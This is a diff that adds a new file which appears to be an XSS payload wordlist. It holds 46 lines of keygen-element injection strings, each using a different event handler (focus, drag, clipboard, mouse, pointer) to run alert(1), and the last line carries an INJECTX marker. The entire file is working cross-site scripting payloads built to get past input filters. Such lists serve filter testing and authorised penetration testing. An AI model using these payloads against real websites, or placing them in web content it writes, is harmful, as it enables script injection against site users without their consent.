@@ -1,0 +1,46 @@
+<keygen autofocus onfocus=alert(1)>
+<keygen autofocus onfocusin=alert(1)>
+<keygen draggable="true" ondrag="alert(1)">test</keygen>
+<keygen draggable="true" ondragend="alert(1)">test</keygen>
+<keygen draggable="true" ondragenter="alert(1)">test</keygen>
+<keygen draggable="true" ondragleave="alert(1)">test</keygen>
+<keygen draggable="true" ondragstart="alert(1)">test</keygen>
+<keygen id=x onfocus=alert(1)>
+<keygen id=x onfocusin=alert(1)>
+<keygen id=x tabindex=1 onactivate=alert(1)></keygen>
+<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>
+<keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>
+<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>
+<keygen onafterscriptexecute=alert(1)><script>1</script>
+<keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
+<keygen onbeforecut="alert(1)" contenteditable>test</keygen>
+<keygen onbeforepaste="alert(1)" contenteditable>test</keygen>
+<keygen onbeforescriptexecute=alert(1)><script>1</script>
+<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<keygen onclick="alert(1)">test</keygen>
+<keygen oncontextmenu="alert(1)">test</keygen>
+<keygen oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<keygen oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<keygen ondblclick="alert(1)" autofocus tabindex=1>test</keygen>
+<keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>
+<keygen onkeydown="alert(1)" contenteditable>test</keygen>
+<keygen onkeypress="alert(1)" contenteditable>test</keygen>
+<keygen onkeyup="alert(1)" contenteditable>test</keygen>
+<keygen onmousedown="alert(1)">test</keygen>
+<keygen onmouseenter="alert(1)">test</keygen>
+<keygen onmouseleave="alert(1)">test</keygen>
+<keygen onmousemove="alert(1)">test</keygen>
+<keygen onmouseout="alert(1)">test</keygen>
+<keygen onmouseover="alert(1)">test</keygen>
+<keygen onmouseup="alert(1)">test</keygen>
+<keygen onmousewheel=alert(1)>requires scrolling
+<keygen onpaste="alert(1)" contenteditable>test</keygen>
+<keygen onpointerdown=alert(1)>XSS</keygen>
+<keygen onpointerenter=alert(1)>XSS</keygen>
+<keygen onpointerleave=alert(1)>XSS</keygen>
+<keygen onpointermove=alert(1)>XSS</keygen>
+<keygen onpointerout=alert(1)>XSS</keygen>
+<keygen onpointerover=alert(1)>XSS</keygen>
+<keygen onpointerrawupdate=alert(1)>XSS</keygen>
+<keygen onpointerup=alert(1)>XSS</keygen>
+<keygen autofocus onfocus=alert(1)>//INJECTX
